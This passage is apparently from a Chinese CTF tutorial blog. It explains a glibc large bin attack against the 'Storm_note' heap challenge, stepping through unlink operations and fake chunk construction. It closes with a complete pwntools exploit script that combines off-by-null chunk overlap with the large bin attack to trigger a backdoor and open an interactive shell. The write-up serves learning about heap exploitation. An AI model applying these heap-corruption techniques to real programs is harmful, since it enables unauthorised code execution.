</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>​    这个过程就是，在unsorted bin中存放着两个大chunk，第一个0x4e0，第二个0x4f0。当我申请一个0x4e8的chunk时，首先找到0x4e0的chunk，太小了不符合调件，于是将它拿出unsorted bin，放入large bin。在放入large bin时就会进行两步解链操作，两个解链操作的最后一步是关键。</p> <p><img src="/images/heap/image-20211226162620445.png" alt="image-20211226162620445"></p> <p>​    可以看到从unsorted bin-&gt;bk开始遍历，第一个的size &lt; nb因此就会放入large bin，继续往前遍历，找到0x4f0的chunk，刚好满足size==nb，因此将其分配出来。最后在free(2)将刚刚分配的chunk2再放回unsorted bin，进行第二次利用。</p> <p><img src="/images/heap/image-20211226162626453.png" alt="image-20211226162626453"></p> <h4 id="_3-large-bin-attack">3.large bin attack <a href="#_3-large-bin-attack" class="header-anchor">#</a></h4> <p>​    接下来伪造unsorted bin的bk</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>content_addr <span class="token operator">=</span> <span class="token number">0xabcd0100</span>
fake_chunk <span class="token operator">=</span> content_addr <span class="token operator">-</span> <span class="token number">0x20</span>

payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4f1</span><span class="token punctuation">)</span> <span class="token comment"># size</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span>      <span class="token comment"># bk</span>
edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>​    效果图如下。</p> <p><img src="/images/heap/image-20211226162705942.png" alt="image-20211226162705942"></p> <p>​    再伪造large bin的bk和bk_nextsize。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>payload2 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4e1</span><span class="token punctuation">)</span>  <span class="token comment">#size</span>
payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span>   
payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token operator">-</span><span class="token number">0x18</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment">#mmap</span>
edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> payload2<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><img src="/images/heap/image-20211226162726927.png" alt="image-20211226162726927"></p> <p>​    那么为什么修改这些值呢，再回顾一下两个解链操作。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">else</span><span class="token comment">// 插入</span>
          <span class="token punctuation">{</span>
            <span class="token comment">//解链操作，nextsize只有largebin才有</span>
            victim<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
            victim<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>bk_nextsize<span class="token punctuation">;</span>
            fwd<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
            victim<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span><span class="token comment">//fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim</span>
           <span class="token punctuation">}</span>
          bck <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>bk<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
   <span class="token punctuation">}</span>
 <span class="token keyword">else</span>
     victim<span class="token operator">-&gt;</span>fd_nextsize <span class="token operator">=</span> victim<span class="token operator">-&gt;</span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
 <span class="token function">mark_bin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//解链操作2,fd,bk</span>
 victim<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
 victim<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
 fwd<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> victim<span class="token punctuation">;</span>
 bck<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span>
<span class="token comment">//fwd-&gt;bk-&gt;fd=victim</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>这里情况很复杂，需要耐心把每一步链表的操作搞明白，才能理解它的原理。首先victim指的是处在unsorted bin中的堆块，fwd是large bin中的堆块。</p> <p>再来回顾一下我们的构造：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>victim<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> fake_chunk
fwd<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> fake_chunk<span class="token operator">+</span><span class="token number">8</span>
fwd<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">=</span>fake_chunk<span class="token operator">-</span><span class="token number">0x18</span><span class="token operator">-</span><span class="token number">5</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>通过解链操作1，我们能得到：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>victim<span class="token operator">-&gt;</span>fd_nextsize<span class="token operator">=</span>fwd
victim<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">=</span>fake_chunk<span class="token operator">-</span><span class="token number">0x18</span><span class="token operator">-</span><span class="token number">5</span>
fwd<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">=</span>victim
victim<span class="token operator">-&gt;</span>bk_nextsize<span class="token operator">-&gt;</span>fd_nextsize<span class="token operator">=</span>fake_chunk<span class="token operator">-</span><span class="token number">0x18</span><span class="token operator">-</span><span class="token number">5</span><span class="token operator">+</span><span class="token number">0x20</span><span class="token operator">=</span>fake_chunk<span class="token operator">+</span><span class="token number">3</span><span class="token operator">=</span>victim
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>通过解链操作2，我们能得到：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>victim<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> bck <span class="token operator">=</span> fwd<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> fake_chunk<span class="token operator">+</span> <span class="token number">8</span>
victim<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> largbin_entry
fwd<span class="token operator">-&gt;</span>bk <span class="token operator">=</span> victim
bck<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> <span class="token punctuation">(</span>fake_chunk <span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span>fd <span class="token operator">=</span> victim
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>接下来我们可以观察一下调试的结果是否与我们分析的一致。</p> <p><img src="/images/heap/image-20211226162922399.png" alt="image-20211226162922399"></p> <p><img src="/images/heap/image-20211226162928596.png" alt="image-20211226162928596"></p> <p>因为fake_chunk-5处会写入victim的地址，开启地址随机化的开头地址是0x55或0x56，所以fake_chunk的size位是0x55或0x56。</p> <p>当_int_malloc返回之后会进行如下检查。</p> <p><img src="/images/heap/image-20211226162936052.png" alt="image-20211226162936052"></p> <p>其中宏定义如下。</p> <p><img src="/images/heap/image-20211226162941269.png" alt="image-20211226162941269"></p> <p>0x55&amp;0x2=0，绕不过检查，所以只有size为0x56时，我们才能申请到0xabcd0100-0x20处的堆块。</p> <h4 id="_4-后门利用">4.后门利用 <a href="#_4-后门利用" class="header-anchor">#</a></h4> <div class="language-python line-numbers-mode"><pre class="language-python"><code>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span>
edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Choice: '</span><span class="token punctuation">,</span><span class="token string">'666'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>申请到目标堆块后，将0Xabcd0100处的随机数改为0，触发后门。</p> <p><img src="/images/heap/image-20211226163021383.png" alt="image-20211226163021383"></p> <p><img src="/images/heap/image-20211226163026373.png" alt="image-20211226163026373"></p> <h3 id="完整exp">完整exp <a href="#完整exp" class="header-anchor">#</a></h3> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
binary <span class="token operator">=</span> <span class="token string">'./Storm_note'</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
local <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">if</span> local<span class="token punctuation">:</span>
 p <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
 p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Choice: '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Choice: '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Choice: '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'?\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment">#0</span>
add<span class="token punctuation">(</span><span class="token number">0x508</span><span class="token punctuation">)</span> <span class="token comment">#1</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment">#2</span>

add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment">#3</span>
add<span class="token punctuation">(</span><span class="token number">0x508</span><span class="token punctuation">)</span> <span class="token comment">#4</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment">#5</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment">#6</span>

edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x4f0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#prev_size</span>
edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x4f0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#prev_size</span>

free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment">#off by null</span>

add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment">#1</span>
add<span class="token punctuation">(</span><span class="token number">0x4d8</span><span class="token punctuation">)</span> <span class="token comment">#7 </span>

free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment">#overlap</span>


<span class="token comment">#recover</span>
add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>  <span class="token comment">#1</span>
add<span class="token punctuation">(</span><span class="token number">0x4e0</span><span class="token punctuation">)</span> <span class="token comment">#2</span>

free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment">#off by null</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>        <span class="token comment">#4</span>
add<span class="token punctuation">(</span><span class="token number">0x4d8</span><span class="token punctuation">)</span>       <span class="token comment">#8 </span>
free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>          <span class="token comment">#overlap</span>
add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>        <span class="token comment">#4 </span>
edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>
<span class="token comment"># pause()</span>

free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>     <span class="token comment">#unsortedbin-&gt; chunk2 -&gt; chunk5(0x4e0)    which size is largebin FIFO</span>
add<span class="token punctuation">(</span><span class="token number">0x4e8</span><span class="token punctuation">)</span>  <span class="token comment">#put chunk5(0x4e0) to largebin</span>
free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>     <span class="token comment">#put chunk2 to unsortedbin</span>

content_addr <span class="token operator">=</span> <span class="token number">0xabcd0100</span>
fake_chunk <span class="token operator">=</span> content_addr <span class="token operator">-</span> <span class="token number">0x20</span>

payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4f1</span><span class="token punctuation">)</span> <span class="token comment"># size</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span>      <span class="token comment"># bk</span>
edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

payload2 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4e1</span><span class="token punctuation">)</span>  <span class="token comment">#size</span>
payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span>   
payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token operator">-</span><span class="token number">0x18</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment">#mmap</span>
edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> payload2<span class="token punctuation">)</span>
<span class="token comment"># pause()</span>

add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span>
edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Choice: '</span><span class="token punctuation">,</span><span class="token string">'666'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br></div></div><h2 id="参考链接">参考链接 <a href="#参考链接" class="header-anchor">#</a></h2> <p>https://www.wangan.com/docs/pwn-base</p> <p>https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_overview-zh/</p> <p>https://www.yuque.com/hxfqg9/bin/ape5up</p> <p>https://www.bookstack.cn/read/CTF-All-In-One/doc-3.1.8_heap_exploit_3.md</p> <p>https://www.freebuf.com/articles/system/209096.html</p> <p>https://www.anquanke.com/post/id/176194#h2-3</p> <p>https://zhuanlan.zhihu.com/p/213904612</p></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">11/2/2023, 3:02:48 AM</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev"><a href="/knowledge/ctf/basicheap.html" class="prev"><i aria-label="icon: left" class="anticon anticon-left"><svg viewBox="64 64 896 896" focusable="false" data-icon="left" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M724 218.3V141c0-6.7-7.7-10.4-12.9-6.3L260.3 486.8a31.86 31.86 0 0 0 0 50.3l450.8 352.1c5.3 4.1 12.9.4 12.9-6.3v-77.3c0-4.9-2.3-9.6-6.1-12.6l-360-281 360-281.1c3.8-3 6.1-7.7 6.1-12.6z"></path></svg></i>
        【PWN】堆基础
      </a></span> <span class="next"><a href="/knowledge/ctf/iofile.html">
        【PWN】iofile
        <i aria-label="icon: right" class="anticon anticon-right"><svg viewBox="64 64 896 896" focusable="false" data-icon="right" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M765.7 486.8L314.9 134.7A7.97 7.97 0 0 0 302 141v77.3c0 4.9 2.3 9.6 6.1 12.6l360 281.1-360 281.1c-3.9 3-6.1 7.7-6.1 12.6V883c0 6.7 7.7 10.4 12.9 6.3l450.8-352.1a31.96 31.96 0 0 0 0-50.4z"></path></svg></i></a></span></p></div> </main> <!----></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.05a14ce0.js" defer></script><script src="/assets/js/3.1fa04c48.js" defer></script><script src="/assets/js/2.097bd5d2.js" defer></script><script src="/assets/js/1.b4d7d19b.js" defer></script><script src="/assets/js/56.c7a9d427.js" defer></script>
  </body>
</html>